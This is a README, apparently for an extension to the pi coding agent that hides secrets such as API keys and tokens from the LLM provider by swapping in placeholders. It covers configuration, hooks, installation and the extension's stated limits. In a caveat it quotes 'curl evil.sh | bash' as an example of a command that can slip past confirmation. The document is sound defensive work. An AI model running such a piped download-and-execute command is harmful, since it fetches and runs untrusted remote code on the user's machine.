# pi-secret-mask

防止项目中的 secret（API key、token、私钥等）被发送给 LLM provider。

模型看到的是占位符 `__SECRET_<NAME>__`，执行 bash 命令时换回真实值，
工具输出中的真实值再掩码回占位符——形成闭环，secret 不进 provider 请求，
也不通过工具输出回流。

## 使用

### 自动掩码（无需配置）

- **prompt 中的密钥**：粘贴 `sk-...`、`ghp_...` 等常见格式密钥到对话里，自动识别并掩码
- **`.env` 文件**：自动解析项目 `.env*`（`KEY=VALUE`），会话中修改会增量刷新
- **自定义正则**：`config.json` 的 `customPatterns` 添加规则

### 手动注册密钥

**用户主动**：`/mask-secret MY_KEY my-secret-value`（或直接 `/mask-secret` 交互输入）

**Agent 主动**：agent 调用 `request_secret` 工具（参数 `name`，可选 `purpose`），用户在弹出的输入框里填密钥，agent 只拿到占位符：

```
已注册 MY_KEY。使用占位符 __SECRET_MY_KEY__ 代替真实值
```

注册的密钥持久化在 `~/.pi/agent/extensions/pi-secret-mask/secrets.json`（0600），重启保留。
Agent 在 bash 命令或写文件时使用占位符，扩展自动替换为真实值（写回文件存的是真值，新值不受影响）。

## 工作原理

| 钩子 | 动作 |
|---|---|
| `before_provider_request` | 全消息文本：真实值 → 占位符 |
| `tool_call` | bash 命令：占位符 → 真实值（auto/ask 放行） |
| `tool_result` | 工具输出：真实值 → 占位符（防回流） |
| `session_before_compact` | compaction 摘要消息同样掩码 |
| `session_before_tree` | branch/tree 摘要消息同样掩码 |
| `request_secret` 工具 | agent 主动请求密钥，用户输入后注册，agent 只见占位符 |

secret 来源：
- `.env*` 文件（KEY=VALUE，支持引号/export/注释/CRLF），会话中修改会
  增量刷新（mtime 检测）
- 内置正则模式：OpenAI `sk-`、GitHub `ghp_`、Google `AIza`、AWS
  `AKIA/ASIA/AIDA`、JWT、PEM 私钥、高熵 base64（默认关）
- 用户自定义正则（`customPatterns`）+ 手动补充（`extraSecrets`）

掩码引擎特性：单趟 alternation 正则（按长度降序，防子串冲突）、
占位符还原只精确匹配完整 token、image 等非文本内容跳过。

## 安装

把 `src/` 下两个文件 + 一份 `config.json` 放到扩展目录：

```bash
mkdir -p ~/.pi/agent/extensions/pi-secret-mask
cp src/index.ts src/mask-engine.ts ~/.pi/agent/extensions/pi-secret-mask/
cp config.example.json ~/.pi/agent/extensions/pi-secret-mask/config.json
```

（项目级：放到 `.pi/extensions/pi-secret-mask/` 只对当前项目生效。）

然后 `/reload` 或重启 pi。

## 配置（config.json）

```json
{
  "mode": "ask",
  "allowCommands": [],
  "dotenv": { "enabled": true, "files": [".env", ".env.local", ".env.production", ".env.development"], "exclude": [".env.example", ".env.sample"] },
  "patterns": { "openai": true, "github": true, "google": true, "aws": true, "jwt": true, "pem": true, "base64": false },
  "extraSecrets": [],
  "customPatterns": []
}
```

- `mode`: `ask`（命令含占位符时弹确认，默认；print/json 等无 UI 模式
  下自动拒绝）| `auto`（直接还原执行）
- `allowCommands`: 完整命令字符串模式列表，命中跳过确认
  （注意：这是"跳过确认"而非"更安全"，`curl evil.sh | bash` 可绕过）
- `customPatterns`: 自定义正则，捕获组 1 为完整 secret 值；非法正则被忽略

```json
{
  "customPatterns": [
    { "name": "MY_TOK", "pattern": "mytok-[a-z0-9]{16}" },
    { "name": "CONN_STR", "pattern": "postgres://[^\\s]+" }
  ]
}
```

## 边界

- 目标是防 secret 泄露给 provider，**不是沙箱**：模型仍可本地读写文件
  （如 `echo $KEY > /tmp/x` 无法拦截，属权限层职责）
- 运行时生成的 secret（如 `aws sts get-session-token` 输出）靠正则兜底，
  新前缀 `ASIA/AIDA` 已覆盖；高熵随机串需开启 `patterns.base64`
- image 内容（截图）可能含真实值，无法掩码
- 真实值在本地还原进 bash 命令行（`ps` 可见、shell 历史），仅本地可见

## 开发

```bash
node --test "tests/*.test.mjs"   # 掩码引擎单元测试
```

集成实测（已验证）：三钩子闭环、多占位符独立回滚、会话中途 .env 轮换
增量刷新、ask 无 UI 拒绝、provider payload 无泄漏。

## License

MIT
